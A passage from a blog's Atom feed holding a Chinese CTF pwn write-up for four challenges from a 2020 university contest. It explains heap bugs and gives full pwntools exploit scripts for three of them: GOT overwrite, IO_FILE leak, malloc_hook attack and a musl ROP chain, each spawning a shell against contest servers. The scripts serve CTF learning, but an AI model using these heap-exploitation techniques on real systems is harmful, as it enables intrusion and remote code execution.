    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
